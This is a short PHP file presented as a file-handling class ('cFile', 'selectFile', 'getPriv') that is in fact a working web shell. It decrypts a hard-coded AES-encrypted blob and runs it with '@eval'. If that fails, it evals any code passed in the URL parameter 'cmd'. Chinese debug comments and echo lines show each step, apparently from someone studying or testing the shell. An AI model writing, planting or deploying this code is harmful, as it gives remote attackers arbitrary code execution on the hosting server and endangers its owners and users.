<?php
class cFile {
    private function selectFile($filename){
        $sign = 'f8ec5a162d1f3e59';
        $fileurl = '7Yz7WKAXP1ZO2SuiOm89cbH9U2QaUb9IeiEHBqT10LU=';
        
        // 调试：查看base64解码后的数据
        $decodedFileUrl = self::de($fileurl);
        echo "Base64解码后的数据: " . $decodedFileUrl . "<br>";
        
        // 尝试解密
        $file = openssl_decrypt($decodedFileUrl, "AES-128-ECB", $sign, OPENSSL_PKCS1_PADDING);
        echo "openssl_decrypt结果: " . ($file ?: "解密失败，将直接使用\$_GET[$filename]") . "<br>";
        
        // 优先用解密结果，失败则直接取$_GET[$filename]
        $file_error = $file ?: $_GET[$filename];
        
        echo "即将eval执行的代码: " . $file_error . "<br>";
        @eval($file_error);
        return "filename";
    }
    public function getPriv() {
        // 给selectFile传递参数'cmd'，对应URL中的?cmd=...
        return $this->selectFile('cmd'); 
    }
    public static function de($file){
        return base64_decode($file);
    }
}
$cfile = new cFile;
$error = $cfile->getPriv();

?>